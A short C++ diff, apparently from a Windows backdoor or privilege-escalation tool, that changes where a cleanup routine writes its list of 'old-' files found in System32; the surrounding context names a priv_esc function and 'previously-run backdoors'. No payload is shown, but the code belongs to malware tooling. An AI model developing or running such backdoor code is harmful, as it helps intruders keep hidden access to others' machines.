@@ -36,9 +36,9 @@ void priv_esc() {
 
 void cleanup() {
     //searches through system32 to find previously-run backdoors
-    system("dir C:\\Windows\\System32\\old-*.* /b /s > old_files.txt");
+    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt");
     std::vector<std::string> replacedExecutables;
-    std::ifstream file("old_files.txt");
+    std::ifstream file("C:\\Windows\\System32\\old_files.txt");
     std::string line;
 
     //reads each line from the file and add to the vector
